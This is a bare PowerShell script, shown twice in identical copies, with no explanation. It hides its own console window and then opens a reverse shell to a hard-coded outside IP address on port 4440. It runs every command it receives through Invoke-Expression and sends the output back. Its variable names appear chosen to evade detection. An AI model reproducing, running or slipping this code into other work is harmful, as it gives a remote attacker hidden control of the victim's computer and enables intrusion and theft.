Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
function Hide-Console
{
$consolePtr = [Console.Window]::GetConsoleWindow()
#0 hide
[Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console
$client = New-Object System.Net.Sockets.TCPClient("77.86.23.181",4440)
$river = $client.GetStream();[byte[]]$teeth = 0..65535|%{0}
while(($i = $river.Read($teeth, 0, $teeth.Length)) -ne 0){;$info = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($teeth,0, $i)
$return = (iex $info 2>&1 | Out-String )
$return2 = $return + "PS " + (pwd).Path + "> ";$sendteeth = ([text.encoding]::ASCII).GetBytes($return2);$river.Write($sendteeth,0,$sendteeth.Length)
$river.Flush()}
$client.Close() 

Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
function Hide-Console
{
$consolePtr = [Console.Window]::GetConsoleWindow()
#0 hide
[Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console
$client = New-Object System.Net.Sockets.TCPClient("77.86.23.181",4440)
$river = $client.GetStream();[byte[]]$teeth = 0..65535|%{0}
while(($i = $river.Read($teeth, 0, $teeth.Length)) -ne 0){;$info = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($teeth,0, $i)
$return = (iex $info 2>&1 | Out-String )
$return2 = $return + "PS " + (pwd).Path + "> ";$sendteeth = ([text.encoding]::ASCII).GetBytes($return2);$river.Write($sendteeth,0,$sendteeth.Length)
$river.Flush()}
$client.Close()
